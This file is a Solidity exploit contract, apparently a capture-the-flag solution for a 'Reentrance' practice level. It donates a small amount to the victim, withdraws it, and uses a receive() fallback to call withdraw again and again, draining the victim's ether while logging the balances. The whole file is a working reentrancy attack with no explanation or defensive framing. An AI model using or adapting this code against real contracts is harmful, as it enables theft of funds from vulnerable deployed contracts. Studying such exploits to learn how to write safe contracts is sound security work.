//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "./Reentrance.sol";

contract Reentrance_exp {
    Reentrance victim;
    constructor() payable {
    }

    function pwn(address payable v) public payable {
        victim = Reentrance(v);
        victim.donate{value: 0.0005 ether}(address(this));
        victim.withdraw(0.0005 ether);
    }
    
    receive() external payable {
        console2.log("[+]msg.sender: ", msg.sender.balance);
        console2.log("[+]victim: ", address(victim).balance);
        if(msg.sender.balance > 0){
            victim.withdraw(0.0005 ether);
        }
        console2.log("[+]victim: ", address(victim).balance);
    }
}

